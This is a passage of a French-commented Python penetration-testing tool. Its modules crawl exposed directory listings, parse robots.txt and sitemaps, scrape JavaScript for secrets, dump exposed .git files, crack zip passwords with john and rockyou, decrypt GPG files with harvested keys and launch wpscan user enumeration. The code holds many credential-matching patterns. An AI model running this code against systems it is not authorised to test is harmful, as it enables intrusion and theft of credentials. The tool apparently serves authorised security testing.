            if href.startswith("http"):
                continue
            if href.startswith("/"):
                # Lien absolu sur le même domaine → on le garde tel quel
                from urllib.parse import urlparse
                parsed = urlparse(base_url)
                link = f"{parsed.scheme}://{parsed.netloc}{href}"
            else:
                link = f"{base_url}/{href}"
            links.append(link)
        return links

    def _grep_creds(text: str) -> List[str]:
        """Cherche des patterns de credentials dans un texte."""
        patterns = [
            r"password\s*[:=]\s*\S+",
            r"passwd\s*[:=]\s*\S+",
            r"username\s*[:=]\s*\S+",
            r"user\s*[:=]\s*\S+",
            r"pass\s*[:=]\s*\S+",
            r"secret\s*[:=]\s*\S+",
            r"token\s*[:=]\s*\S+",
            r"api[_-]?key\s*[:=]\s*\S+",
        ]
        hits = []
        for pat in patterns:
            for m in re.finditer(pat, text, re.IGNORECASE):
                hits.append(m.group(0).strip()[:120])
        return list(dict.fromkeys(hits))   # déduplique

    # ── Exploration ──
    visited: set = set()

    def _explore(url: str, depth: int = 0) -> None:
        if url in visited or depth > 2:
            return
        visited.add(url)

        result = _get(url)
        if result is None:
            return
        status, body = result

        report_lines.append(f"[{status}] {url}")

        # Directory listing détecté
        is_dirlist = (
            "Index of /" in body
            or "<title>Index of" in body
            or "Directory listing for" in body
        )
        if is_dirlist:
            ok(f"[+] [ffuf followup] Directory listing: {url}")
            report_lines.append(f"  → Directory listing détecté!")
            findings.append({
                "severity": "medium",
                "title": f"Directory listing exposé: {url}",
                "source": "ffuf_followup",
                "evidence_file": str(report_path),
            })
            # Extrait et explore les liens enfants
            child_links = _extract_dir_links(url, body)
            for link in child_links:
                report_lines.append(f"  → Lien trouvé: {link}")
                _explore(link, depth + 1)

        # Fichier intéressant : téléchargement
        if _is_interesting_url(url) and status in (200, 301, 302):
            fname = safe_name(url.rstrip("/").rsplit("/", 1)[-1]) or "unknown"
            dest  = download_dir / fname
            if not dest.exists():
                ok(f"[+] [ffuf followup] Téléchargement: {url} → {dest.name}")
                report_lines.append(f"  → Téléchargé: {dest}")
                if _download(url, dest):
                    findings.append({
                        "severity": "high" if any(url.lower().endswith(e) for e in (".zip", ".tar", ".gpg", ".key", ".pem")) else "medium",
                        "title": f"Fichier sensible trouvé: {url}",
                        "source": "ffuf_followup",
                        "evidence_file": str(dest),
                    })
                    # Grep creds dans les fichiers texte
                    if dest.stat().st_size < 500_000:
                        try:
                            text = dest.read_text(encoding="utf-8", errors="replace")
                            creds = _grep_creds(text)
                            if creds:
                                ok(f"[+] [ffuf followup] Credentials potentiels dans {fname}:")
                                for c in creds[:10]:
                                    ok(f"    {c}")
                                report_lines.append(f"  → Credentials potentiels:")
                                for c in creds[:10]:
                                    report_lines.append(f"    {c}")
                                findings.append({
                                    "severity": "critical",
                                    "title": f"Credentials en clair dans {fname}",
                                    "source": "ffuf_followup",
                                    "evidence_file": str(dest),
                                    "creds": creds,
                                })
                        except Exception as _exc:
                            warn(f"[run_ffuf_followup] {_exc}")

        # Nouvelle URL web à ajouter au pipeline
        if url not in new_urls and status in (200, 301, 302):
            new_urls.append(url)

    # ── Lance l'exploration sur chaque résultat ffuf ──
    for url, status in found_urls:
        _explore(url)

    # Sauvegarde le rapport
    try:
        report_path.write_text("\n".join(report_lines), encoding="utf-8")
    except Exception as _exc:
        warn(f"[run_ffuf_followup] {_exc}")

    if findings:
        ok(f"[ffuf followup] {len(findings)} finding(s) — voir {report_path}")
    else:
        info("[ffuf followup] Aucun fichier sensible trouvé.")

    return new_urls, findings


# -------------------- ROBOTS.TXT / SITEMAP RECON --------------------

def run_robots_recon(cfg: Config, urls: List[str], logs_dir: Path) -> List[str]:
    """
    Récupère robots.txt et sitemap.xml sur chaque URL de BASE (scheme+host uniquement).
    Extrait les chemins Disallow/Allow ET les fichiers listés en texte brut.
    Télécharge automatiquement les fichiers intéressants (wordlists, clés, flags...).
    Retourne une liste de nouvelles URLs découvertes.
    """
    import urllib.request as _ur
    import urllib.error   as _ue
    from urllib.parse import urlparse as _up

    if not cfg.run_robots:
        return []

    info("[robots] Analyse robots.txt + sitemap.xml")
    out      = logs_dir / "robots_recon.txt"
    dl_dir   = logs_dir / "robots_downloads"
    dl_dir.mkdir(exist_ok=True)
    lines    = [f"# robots.txt / sitemap recon — {now_iso()}", ""]
    new_urls : List[str] = []
    seen     : set       = set()

    # ── Tester la base + les chemins sans extension ni query params ──────────
    # Logique : seul un vrai répertoire peut héberger son propre robots.txt.
    # /wp-login.php/robots.txt n'a aucun sens → on skip les URLs avec extension
    # ou query params. /admin/ ou /admin sont valides.
    _FILE_EXTS = (".php", ".html", ".htm", ".js", ".css", ".txt", ".xml",
                  ".json", ".ico", ".png", ".jpg", ".gif", ".svg", ".pdf")
    base_urls: List[str] = []
    seen_bases: set = set()
    for u in urls:
        try:
            p = _up(u)
            root = f"{p.scheme}://{p.netloc}"
            # Toujours ajouter la racine
            if root not in seen_bases:
                seen_bases.add(root)
                base_urls.append(root)
            # Ajouter si le path n'a pas d'extension de fichier ni de query params
            path = p.path.rstrip("/")
            if path and not p.query:
                last_seg = path.split("/")[-1]
                has_ext = any(last_seg.lower().endswith(e) for e in _FILE_EXTS)
                if not has_ext:
                    dir_url = root + path
                    if dir_url not in seen_bases:
                        seen_bases.add(dir_url)
                        base_urls.append(dir_url)
        except Exception as _exc:
            warn(f"[run_robots_recon] {_exc}")

    # Extensions/noms qui valent la peine d'être téléchargés depuis robots.txt
    _INTERESTING_EXT = (".dic", ".txt", ".zip", ".bak", ".key", ".gpg",
                        ".sql", ".cfg", ".conf", ".log", ".sh", ".py")
    _INTERESTING_NAME = ("key", "flag", "secret", "password", "passwd",
                         "credential", "token", "backup", "wordlist")

    def _is_interesting(path: str) -> bool:
        low = path.lower()
        return (any(low.endswith(e) for e in _INTERESTING_EXT) or
                any(n in low for n in _INTERESTING_NAME))

    def _fetch(url: str, timeout: int = 10, max_bytes: int = 500_000):
        req = _ur.Request(url, headers={"User-Agent": "pentool/0.68"})
        with _ur.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(max_bytes)

    for base in base_urls:
        for path in ("/robots.txt", "/sitemap.xml", "/sitemap_index.xml"):
            target = base + path
            try:
                status, raw = _fetch(target)
                body = raw.decode("utf-8", errors="replace")
            except _ue.HTTPError as e:
                if e.code == 404:
                    continue
                status, body = e.code, ""
            except Exception:
                continue

            if status != 200 or not body.strip():
                continue

            # Valider que c'est bien un robots.txt (pas du HTML/XML WordPress)
            stripped_body = body.strip()
            if path == "/robots.txt":
                is_html = stripped_body.lower().startswith(("<!doctype", "<html", "<?xml"))
                is_robots = "user-agent" in stripped_body.lower()
                if is_html and not is_robots:
                    # WordPress retourne du HTML pour les chemins inconnus — ignorer
                    continue

            ok(f"[+] [robots] {target} ({len(body)} octets)")
            lines += [f"[{status}] {target}", body[:3000], ""]

            if path == "/robots.txt":
                _KNOWN_DIRECTIVES = ("user-agent", "disallow", "allow",
                                     "sitemap", "crawl-delay", "host", "#")
                for rline in body.splitlines():
                    stripped = rline.strip()
                    if not stripped:
                        continue
                    low = stripped.lower()

                    # ── Disallow / Allow standard ──
                    if low.startswith(("disallow:", "allow:")):
                        raw_path = stripped.split(":", 1)[1].strip().rstrip("*")
                        if raw_path and raw_path != "/":
                            full = base + raw_path
                            if full not in seen:
                                seen.add(full)
                                new_urls.append(full)
                                info(f"  → [robots] Chemin: {full}")

                    # ── Lignes hors directives = fichiers/paths non standard ──
                    elif not any(low.startswith(d) for d in _KNOWN_DIRECTIVES):
                        # Peut être un chemin relatif ou un nom de fichier
                        candidate = stripped.lstrip("/")
                        full = base + "/" + candidate
                        if full not in seen:
                            seen.add(full)
                            new_urls.append(full)
                            info(f"  → [robots] Entrée non-standard: {full}")

                        # Télécharger si le fichier semble intéressant
                        if _is_interesting(candidate):
                            try:
                                st2, content = _fetch(full, timeout=30, max_bytes=50_000_000)  # 50 Mo max
                                if st2 == 200 and content:
                                    safe_name = candidate.replace("/", "_")
                                    dest = dl_dir / safe_name
                                    dest.write_bytes(content)
                                    ok(f"[+] [robots] Fichier téléchargé: {full} → {safe_name} ({len(content)} octets)")
                                    lines.append(f"[DOWNLOADED] {full} → {safe_name} ({len(content)} octets)")
                                    # Afficher le contenu si c'est du texte court
                                    if len(content) < 500:
                                        try:
                                            lines.append(content.decode("utf-8", errors="replace"))
                                        except Exception as _exc:
                                            warn(f"[run_robots_recon] {_exc}")
                            except Exception as _exc:
                                warn(f"[run_robots_recon] {_exc}")

            # ── sitemap : extrait <loc> ──
            if "sitemap" in path:
                for loc in re.findall(r"<loc>([^<]+)</loc>", body):
                    loc = loc.strip()
                    if loc not in seen:
                        seen.add(loc)
                        new_urls.append(loc)

    try:
        out.write_text("\n".join(lines), encoding="utf-8")
    except Exception as _exc:
        warn(f"[run_robots_recon] {_exc}")

    if new_urls:
        ok(f"[robots] {len(new_urls)} chemin(s) extrait(s) → ajoutés au pipeline")
    else:
        info("[robots] Aucun nouveau chemin trouvé")
    return new_urls


# -------------------- JS SCRAPER --------------------

_JS_SECRET_PATTERNS = [
    (r'(?i)api[_-]?key\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']',       "API Key"),
    (r'(?i)api[_-]?secret\s*[:=]\s*["\']([A-Za-z0-9_\-]{20,})["\']',    "API Secret"),
    (r'(?i)token\s*[:=]\s*["\']([A-Za-z0-9_\-\.]{20,})["\']',           "Token"),
    (r'(?i)password\s*[:=]\s*["\']([^"\']{4,50})["\']',                  "Password"),
    (r'(?i)passwd\s*[:=]\s*["\']([^"\']{4,50})["\']',                    "Passwd"),
    (r'(?i)secret\s*[:=]\s*["\']([A-Za-z0-9_\-]{8,})["\']',             "Secret"),
    (r'(?i)authorization\s*[:=]\s*["\']([^"\']{10,})["\']',              "Authorization"),
    (r'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+',          "JWT Token"),
    (r'(?i)aws[_-]?access[_-]?key\s*[:=]\s*["\']([A-Z0-9]{20})["\']',   "AWS Key"),
    (r'(?i)private[_-]?key\s*[:=]\s*["\']([^"\']{10,})["\']',           "Private Key"),
]

_JS_ENDPOINT_PATTERNS = [
    r'(?:fetch|axios\.(?:get|post|put|delete)|xhr\.open)\s*\(\s*["\']([/][^"\']+)["\']',
    r'url\s*[:=]\s*["\']([/][a-zA-Z0-9_\-/\.?=&]{3,})["\']',
    r'"(/(?:api|v[0-9]|rest|graphql)[^"<>]{2,})"',
    r"'(/(?:api|v[0-9]|rest|graphql)[^'<>]{2,})'",
]

_CDN_SKIP = ("jquery.com","googleapis","cloudflare","bootstrapcdn","unpkg.com",
             "cdnjs.com","fontawesome","ajax.aspnetcdn","jsdelivr.net")


def run_js_scraper(cfg: Config, urls: List[str], logs_dir: Path) -> dict:
    """
    Trouve et analyse les fichiers JavaScript de la cible.
    Cherche : API keys, tokens, credentials, endpoints cachés.
    Retourne un dict avec les secrets et endpoints trouvés.
    """
    import urllib.request as _ur
    import urllib.error   as _ue
    from urllib.parse import urlparse, urljoin

    if not cfg.run_js_scrape:
        return {}

    info("[JS scraper] Analyse des fichiers JavaScript")
    out   = logs_dir / "js_scraper.txt"
    lines = [f"# JS scraper — {now_iso()}", ""]
    findings: dict = {"secrets": [], "endpoints": [], "js_files": []}
    seen_js: set = set()

    def _get(url: str) -> Optional[str]:
        try:
            req = _ur.Request(url, headers={"User-Agent": "pentool/0.68"})
            with _ur.urlopen(req, timeout=8) as resp:
                return resp.read(500_000).decode("utf-8", errors="replace")
        except Exception:
            return None

    for base_url in urls:
        page = _get(base_url)
        if not page:
            continue

        # ── Collecte les fichiers JS référencés ──
        js_paths = re.findall(r'src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', page)
        for js_path in js_paths[:25]:
            js_url = urljoin(base_url, js_path)
            if any(cdn in js_url for cdn in _CDN_SKIP):
                continue
            if js_url in seen_js:
                continue
            seen_js.add(js_url)

            content = _get(js_url)
            if not content:
                continue

            findings["js_files"].append(js_url)
            lines.append(f"\n=== {js_url} ({len(content)} octets) ===")

            # ── Secrets ──
            for pattern, label in _JS_SECRET_PATTERNS:
                for m in re.finditer(pattern, content):
                    val = m.group(0)[:120]
                    if val not in findings["secrets"]:
                        findings["secrets"].append(f"[{label}] {val}")
                        ok(f"[+] [JS scraper] {label} trouvé: {val[:80]}")
                        lines.append(f"  SECRET [{label}]: {val}")

            # ── Endpoints ──
            for pattern in _JS_ENDPOINT_PATTERNS:
                for m in re.finditer(pattern, content):
                    try:
                        ep = m.group(1)
                        if ep and len(ep) > 2 and ep not in findings["endpoints"]:
                            findings["endpoints"].append(ep)
                    except Exception as _exc:
                        warn(f"[run_js_scraper] {_exc}")

    if findings["endpoints"]:
        lines += [f"\n=== ENDPOINTS ({len(findings['endpoints'])}) ==="] + \
                 [f"  {ep}" for ep in findings["endpoints"][:60]]
        ok(f"[+] [JS scraper] {len(findings['endpoints'])} endpoint(s) découvert(s)")
    if findings["js_files"]:
        info(f"[JS scraper] {len(findings['js_files'])} fichier(s) JS analysé(s)")
    if not findings["secrets"] and not findings["endpoints"]:
        info("[JS scraper] Aucun secret ou endpoint trouvé")

    try:
        out.write_text("\n".join(lines), encoding="utf-8")
    except Exception as _exc:
        warn(f"[run_js_scraper] {_exc}")
    return findings


# -------------------- .GIT EXPOSURE CHECK --------------------

_GIT_FILES = [
    ".git/HEAD", ".git/config", ".git/COMMIT_EDITMSG",
    ".git/description", ".git/logs/HEAD",
    ".git/refs/heads/master", ".git/refs/heads/main",
    ".git/info/exclude", ".git/FETCH_HEAD",
    ".git/packed-refs",
]


def run_git_exposure_check(cfg: Config, urls: List[str], logs_dir: Path) -> Optional[dict]:
    """
    Vérifie si un dépôt .git est exposé publiquement.
    Télécharge les fichiers clés (config, HEAD…) et cherche des credentials.
    """
    import urllib.request as _ur
    import urllib.error   as _ue

    if not cfg.run_git_check:
        return None

    info("[.git] Vérification exposition dépôt Git")
    out      = logs_dir / "git_exposure.txt"
    git_dir  = logs_dir / "git_dump"
    lines    = [f"# .git exposure check — {now_iso()}", ""]
    exposed  = False

    for base_url in urls:
        base = base_url.rstrip("/")
        head_url = f"{base}/.git/HEAD"

        # ── Test rapide : HEAD doit contenir "ref:" ──
        try:
            req = _ur.Request(head_url, headers={"User-Agent": "pentool/0.68"})
            with _ur.urlopen(req, timeout=8) as resp:
                body   = resp.read(500).decode("utf-8", errors="replace")
                status = resp.status
        except Exception:
            continue

        if status != 200 or "ref:" not in body:
            continue

        ok(f"[+] [.git] DÉPÔT GIT EXPOSÉ sur {base}!")
        ok(f"    HEAD → {body.strip()}")
        exposed = True
        lines += [f"GIT EXPOSÉ: {base}/.git/", f"HEAD: {body.strip()}", ""]
        git_dir.mkdir(parents=True, exist_ok=True)

        # ── Télécharge les fichiers clés ──
        for git_file in _GIT_FILES:
            file_url = f"{base}/{git_file}"
            try:
                req = _ur.Request(file_url, headers={"User-Agent": "pentool/0.68"})
                with _ur.urlopen(req, timeout=8) as resp:
                    content = resp.read(100_000).decode("utf-8", errors="replace")
                dest = git_dir / git_file.replace("/", "_").lstrip("_")
                dest.write_text(content, encoding="utf-8")
                ok(f"  → Téléchargé: {git_file}")
                lines += [f"[200] {git_file}", content[:500], ""]

                # Credentials dans git remote URL
                for m in re.finditer(r"url\s*=\s*(https?://[^\s]+)", content):
                    remote_url = m.group(1)
                    if "@" in remote_url:
                        ok(f"  [CRIT] Credentials dans git remote URL: {remote_url}")
                        lines.append(f"  CREDENTIALS: {remote_url}")
            except Exception as _exc:
                warn(f"[run_git_exposure_check] {_exc}")

        info(f"  → Dump complet: git-dumper {base}/.git/ ./git_dump/")
        lines.append(f"\ngit-dumper {base}/.git/ ./git_dump/")

    try:
        out.write_text("\n".join(lines), encoding="utf-8")
    except Exception as _exc:
        warn(f"[run_git_exposure_check] {_exc}")

    if exposed:
        return {
            "severity": "critical",
            "title": ".git exposé — code source récupérable",
            "source": "git_exposure",
            "evidence_file": str(out),
        }
    info("[.git] Aucun dépôt exposé trouvé")
    return None


# -------------------- ARCHIVE ANALYSIS --------------------

def run_archive_analysis(cfg: Config, logs_dir: Path) -> Optional[dict]:
    """
    Analyse les archives téléchargées par ffuf_followup :
    1. Tente de décompresser (zip/tar/7z).
    2. Si protégée par mot de passe et --archive-crack : zip2john + john.
    3. Grep de credentials dans les fichiers extraits.
    """
    download_dir = logs_dir / "ffuf_downloads"
    if not download_dir.exists():
        return None

    archives = (
        list(download_dir.glob("*.zip"))
        + list(download_dir.glob("*.tar.gz"))
        + list(download_dir.glob("*.tgz"))
        + list(download_dir.glob("*.7z"))
    )
    if not archives:
        return None

    info(f"[archives] Analyse de {len(archives)} archive(s)")
    out   = logs_dir / "archive_analysis.txt"
    lines = [f"# Archive analysis — {now_iso()}", ""]
    all_creds: List[str] = []

    def _grep_creds_in_file(path: Path) -> List[str]:
        hits = []
        try:
            if path.stat().st_size > 2_000_000:
                return []
            text = path.read_text(encoding="utf-8", errors="replace")
            patterns = [
                r"(?i)password\s*[:=]\s*\S+",
                r"(?i)passwd\s*[:=]\s*\S+",
                r"(?i)username\s*[:=]\s*\S+",
                r"(?i)secret\s*[:=]\s*\S+",
                r"(?i)token\s*[:=]\s*[A-Za-z0-9_\-\.]{10,}",
                r"(?i)api[_-]?key\s*[:=]\s*\S+",
            ]
            for pat in patterns:
                for m in re.finditer(pat, text):
                    val = m.group(0).strip()[:100]
                    if val not in hits:
                        hits.append(val)
        except Exception as _exc:
            warn(f"[run_archive_analysis] {_exc}")
        return hits

    for archive in archives:
        lines.append(f"\n=== {archive.name} ===")
        extract_dir = download_dir / archive.stem

        # ── ZIP ──
        if archive.suffix == ".zip":
            try:
                import zipfile
                with zipfile.ZipFile(archive, "r") as zf:
                    if zf.namelist() and zf.testzip() is None:
                        # Non protégé
                        extract_dir.mkdir(exist_ok=True)
                        zf.extractall(extract_dir)
                        ok(f"[+] [archives] {archive.name} extrait → {extract_dir}")
                        lines.append(f"Extrait dans: {extract_dir}")
                        for f in extract_dir.rglob("*"):
                            if f.is_file():
                                lines.append(f"  {f.relative_to(extract_dir)}")
                                creds = _grep_creds_in_file(f)
                                if creds:
                                    ok(f"  [+] Credentials dans {f.name}: {creds[0]}")
                                    lines += [f"  CREDENTIAL: {c}" for c in creds]
                                    all_creds.extend(creds)
            except Exception as e:
                is_encrypted = "password" in str(e).lower() or "encrypt" in str(e).lower()
                if is_encrypted:
                    warn(f"[archives] {archive.name} protégé par mot de passe")
                    lines.append("Archive protégée par mot de passe")
                    if cfg.run_archive_crack and which("zip2john") and which("john"):
                        hash_file = logs_dir / f"{archive.stem}.hash"
                        rc = subprocess.run(
                            ["zip2john", str(archive)],
                            capture_output=True, text=True, timeout=30,
                        )
                        if rc.stdout:
                            hash_file.write_text(rc.stdout)
                            for wl in [
                                "/usr/share/wordlists/rockyou.txt",
                                "/usr/share/seclists/Passwords/Common-Credentials/top-passwords-shortlist.txt",
                            ]:
                                if not Path(wl).exists():
                                    continue
                                subprocess.run(
                                    ["john", f"--wordlist={wl}", str(hash_file)],
                                    capture_output=True, text=True, timeout=120,
                                )
                                show = subprocess.run(
                                    ["john", "--show", str(hash_file)],
                                    capture_output=True, text=True, timeout=10,
                                )
                                if show.stdout and "0 password" not in show.stdout:
                                    ok(f"[+] [archives] MDP trouvé: {show.stdout.strip()[:80]}")
                                    lines.append(f"MDP TROUVÉ: {show.stdout.strip()}")
                                    all_creds.append(show.stdout.strip())
                                    break
                    else:
                        info(f"  → Activer --archive-crack + john pour tenter le cracking")

        # ── TAR.GZ / TGZ ──
        elif archive.suffix in (".gz", ".tgz") or archive.name.endswith(".tar.gz"):
            try:
                import tarfile
                extract_dir.mkdir(exist_ok=True)
                with tarfile.open(archive, "r:gz") as tf:
                    tf.extractall(extract_dir)
                ok(f"[+] [archives] {archive.name} extrait → {extract_dir}")
                lines.append(f"Extrait dans: {extract_dir}")
                for f in extract_dir.rglob("*"):
                    if f.is_file():
                        lines.append(f"  {f.relative_to(extract_dir)}")
                        creds = _grep_creds_in_file(f)
                        if creds:
                            ok(f"  [+] Credentials dans {f.name}")
                            lines += [f"  CREDENTIAL: {c}" for c in creds]
                            all_creds.extend(creds)
            except Exception as e:
                lines.append(f"Erreur extraction: {e}")

    try:
        out.write_text("\n".join(lines), encoding="utf-8")
    except Exception as _exc:
        warn(f"[run_archive_analysis] {_exc}")

    if all_creds:
        return {
            "severity": "critical",
            "title": f"Credentials trouvés dans archives ({len(all_creds)})",
            "source": "archive_analysis",
            "evidence_file": str(out),
            "creds": all_creds,
        }
    if archives:
        return {
            "severity": "info",
            "title": f"Archives analysées: {len(archives)} fichier(s)",
            "source": "archive_analysis",
            "evidence_file": str(out),
        }
    return None


# -------------------- GPG DECRYPT --------------------

def run_gpg_decrypt(cfg: Config, logs_dir: Path) -> Optional[dict]:
    """
    Cherche des fichiers .gpg/.pgp + clés privées dans ffuf_downloads/.
    Tente : gpg --import priv.key → gpg --decrypt fichier.gpg
    Si succès : extrait le contenu et grep les credentials.
    """
    download_dir = logs_dir / "ffuf_downloads"
    if not download_dir.exists():
        return None

    # Cherche récursivement les fichiers chiffrés et les clés
    gpg_files = list(download_dir.rglob("*.gpg")) + list(download_dir.rglob("*.pgp"))
    key_files  = list(download_dir.rglob("*.key")) + list(download_dir.rglob("*.asc")) \
               + list(download_dir.rglob("priv*")) + list(download_dir.rglob("private*"))

    if not gpg_files:
        return None

    info(f"[GPG] {len(gpg_files)} fichier(s) chiffré(s) + {len(key_files)} clé(s) trouvé(s)")
    out   = logs_dir / "gpg_decrypt.txt"
    lines = [f"# GPG decrypt — {now_iso()}", ""]
    found_creds: List[str] = []
    decrypted_files: List[Path] = []

    # Crée un répertoire GPG isolé pour ne pas polluer le trousseau système
    gpg_home = logs_dir / "gpg_home"
    gpg_home.mkdir(mode=0o700, exist_ok=True)
    gpg_env = base_env({"GNUPGHOME": str(gpg_home)})

    def _gpg(*args) -> Tuple[int, str]:
        try:
            r = subprocess.run(
                ["gpg", "--batch", "--yes", "--no-tty"] + list(args),
                capture_output=True, text=True, timeout=30, env=gpg_env,
            )
            return r.returncode, (r.stdout + r.stderr).strip()
        except Exception as e:
            return 1, str(e)

    # 1. Importe toutes les clés trouvées
    for kf in key_files:
        rc, out_txt = _gpg("--import", str(kf))
        msg = f"Import {kf.name}: {'OK' if rc == 0 else 'FAIL'} — {out_txt[:120]}"
        info(f"[GPG] {msg}")
        lines.append(msg)

    # 2. Tente de déchiffrer chaque fichier .gpg
    for gf in gpg_files:
        dest = gf.with_suffix("")   # CustomerDetails.xlsx.gpg → CustomerDetails.xlsx
        rc, out_txt = _gpg("--output", str(dest), "--decrypt", str(gf))
        if rc == 0 and dest.exists():
            ok(f"[+] [GPG] Déchiffrement réussi: {gf.name} → {dest.name}")
            lines += [f"DÉCHIFFRÉ: {dest}", out_txt[:200], ""]
            decrypted_files.append(dest)
        else:
            warn(f"[GPG] Échec déchiffrement {gf.name}: {out_txt[:120]}")
            lines += [f"ÉCHEC: {gf.name}", out_txt[:200], ""]

    # 3. Analyse les fichiers déchiffrés
    for df in decrypted_files:
        ext = df.suffix.lower()

        # ── XLSX : extrait avec openpyxl ou zipfile ──
        if ext in (".xlsx", ".xls", ".ods"):
            lines.append(f"\n=== Contenu de {df.name} ===")
            try:
                import zipfile, xml.etree.ElementTree as _ET
                # Un xlsx est un zip — on cherche les strings dans sharedStrings.xml
                with zipfile.ZipFile(df, "r") as zf:
                    names = zf.namelist()
                    lines.append(f"Fichiers dans l'archive: {names}")
                    # sharedStrings.xml contient le texte des cellules
                    shared = "xl/sharedStrings.xml"
                    if shared in names:
                        xml_content = zf.read(shared).decode("utf-8", errors="replace")
                        root = _ET.fromstring(xml_content)
                        ns = {"ns": "http://schemas.openxmlformats.org/spreadsheetml/2006/main"}
                        strings = [t.text or "" for t in root.findall(".//ns:t", ns) if t.text]
                        ok(f"[+] [GPG] Données extraites du XLSX ({len(strings)} cellules)")
                        lines.append(f"Cellules ({len(strings)}): {strings[:50]}")
                        # Cherche credentials (patterns nom:password, username/password en colonnes)
                        for i, s in enumerate(strings):
                            if any(k in s.lower() for k in ("passw", "password", "secret", "hash")):
                                # Prend les valeurs autour
                                context = strings[max(0,i-2):i+3]
                                cred_line = " | ".join(context)
                                found_creds.append(cred_line)
                                ok(f"[+] [GPG] Credential potentiel: {cred_line[:100]}")
                                lines.append(f"CREDENTIAL: {cred_line}")
            except Exception as e:
                lines.append(f"Erreur parsing XLSX: {e}")
                # Fallback : strings basique
                try:
                    raw = df.read_bytes()
                    text_parts = re.findall(rb'[\x20-\x7e]{4,}', raw)
                    readable = [p.decode("ascii", errors="replace") for p in text_parts[:100]]
                    lines.append("Strings lisibles: " + " | ".join(readable[:30]))
                    for s in readable:
                        if any(k in s.lower() for k in ("pass", "secret", "user", "login", "hash")):
                            found_creds.append(s)
                            ok(f"[+] [GPG] Donnée lisible: {s[:80]}")
                except Exception as _exc:
                    warn(f"[run_gpg_decrypt] {_exc}")

        # ── Fichier texte ──
        elif ext in (".txt", ".csv", ".md", ".json", ".xml", ""):
            try:
                text = df.read_text(encoding="utf-8", errors="replace")
                lines += [f"\n=== {df.name} ===", text[:2000]]
                cred_patterns = [
                    r"(?i)pass(?:word)?\s*[:=]\s*\S+",
                    r"(?i)user(?:name)?\s*[:=]\s*\S+",
                    r"(?i)secret\s*[:=]\s*\S+",
                ]
                for pat in cred_patterns:
                    for m in re.finditer(pat, text):
                        found_creds.append(m.group(0).strip()[:100])
                        ok(f"[+] [GPG] Credential: {m.group(0).strip()[:80]}")
            except Exception as e:
                lines.append(f"Erreur lecture {df.name}: {e}")

    try:
        out.write_text("\n".join(lines), encoding="utf-8")
    except Exception as _exc:
        warn(f"[run_gpg_decrypt] {_exc}")

    if found_creds:
        ok(f"[+] [GPG] {len(found_creds)} credential(s) extrait(s) !")
        return {
            "severity": "critical",
            "title": f"Credentials extraits via GPG ({len(found_creds)})",
            "source": "gpg_decrypt",
            "evidence_file": str(out),
            "creds": found_creds,
        }
    if decrypted_files:
        return {
            "severity": "high",
            "title": f"Fichiers GPG déchiffrés: {[f.name for f in decrypted_files]}",
            "source": "gpg_decrypt",
            "evidence_file": str(out),
        }
    if gpg_files:
        return {
            "severity": "info",
            "title": f"Fichiers GPG trouvés mais non déchiffrés ({len(gpg_files)})",
            "source": "gpg_decrypt",
            "evidence_file": str(out),
        }
    return None


# -------------------- WORDPRESS RECON & EXPLOITATION --------------------

def run_wpscan_recon(cfg: Config, urls: List[str], logs_dir: Path) -> Optional[dict]:
    """
    Scan WordPress automatique dès qu'un WP est détecté :
      - Version WP + vulnérabilités connues (CVE)
      - Plugins/thèmes vulnérables (--enumerate vp,vt)
      - Usernames (--enumerate u)
      - Détection XML-RPC + test d'abus (user enum, pingback)
      - Searchsploit sur CVEs et plugins vulnérables trouvés
    Stocke les usernames trouvés dans logs/wp_users.txt pour le module brute force.
    """
    import re as _re

    # ── 1. Détecter WordPress dans les URLs ──────────────────────────────
    wp_base_url: Optional[str] = None
    for u in urls:
        if "wp-login" in u.lower() or "wp-admin" in u.lower():
            wp_base_url = u.split("wp-")[0].rstrip("/")
            break

    if not wp_base_url:
        return None

    wp_base_url = wp_base_url.replace("https://", "http://")
    xmlrpc_url  = wp_base_url.rstrip("/") + "/xmlrpc.php"
    wp_login    = wp_base_url.rstrip("/") + "/wp-login.php"

    info(f"[WPRecon] WordPress détecté → {wp_base_url}")
    out   = logs_dir / "wpscan_recon.txt"
    lines = [f"# WordPress Recon — {now_iso()}", f"# Target: {wp_base_url}", ""]

    wpscan_bin = shutil.which("wpscan")
    if not wpscan_bin:
        warn("[WPRecon] wpscan non disponible — skip recon WP")
        return None

    findings_wp: List[dict] = []   # vulnérabilités trouvées
    valid_users: List[str]  = []

    # ── 2. Scan complet wpscan ─────────────────────────────────────────
    _wp_mode = "aggressive" if cfg.run_wp_aggressive else "passive"
    _wp_enum = "u,ap,at" if cfg.run_wp_aggressive else "u,vp,vt"
    info(f"[WPRecon] Lancement wpscan (mode: {_wp_mode})...")
    wpscan_out_file = logs_dir / "wpscan_full.txt"
    cmd_scan = [
        wpscan_bin,
        "--url", wp_base_url,
        "--enumerate", _wp_enum,
        # aggressive: tous les plugins/thèmes (ap/at) | passive: uniquement les vulnérables (vp/vt)
        "--plugins-detection", _wp_mode,
        "--themes-detection", _wp_mode,
        "--request-timeout", "30",
        "--connect-timeout", "10",
        "--disable-tls-checks",
        "--no-banner",
        "--output", str(wpscan_out_file),
        "--format", "cli",
    ]
    # En mode passif on throttle pour ne pas surcharger les serveurs lents
    if not cfg.run_wp_aggressive:
        cmd_scan += ["--throttle", "200"]
    lines += [f"$ {' '.join(cmd_scan)}", ""]
    try:
        proc = subprocess.run(cmd_scan, capture_output=True, text=True, timeout=240)
        # wpscan avec --output écrit dans le fichier, pas sur stdout
        # → on lit le fichier produit ; sinon on tombe sur stdout+stderr (vide)
        if wpscan_out_file.exists() and wpscan_out_file.stat().st_size > 0:
            scan_out = wpscan_out_file.read_text(encoding="utf-8", errors="replace")
        else:
            scan_out = proc.stdout + proc.stderr
            wpscan_out_file.write_text(scan_out, encoding="utf-8")
        lines.append(scan_out[:12000])
        ok(f"[WPRecon] wpscan terminé ({len(scan_out)} bytes)")
    except subprocess.TimeoutExpired:
        warn("[WPRecon] wpscan timeout (4 min)")
        # Lire le fichier partiel si wpscan a quand même écrit quelque chose
        if wpscan_out_file.exists() and wpscan_out_file.stat().st_size > 0:
            scan_out = wpscan_out_file.read_text(encoding="utf-8", errors="replace")
            lines.append(scan_out[:12000])
        else:
            scan_out = ""
    except Exception as e:
        warn(f"[WPRecon] wpscan erreur: {e}")
        scan_out = ""

    # ── 3. Parser la sortie wpscan ────────────────────────────────────
    # Version WordPress
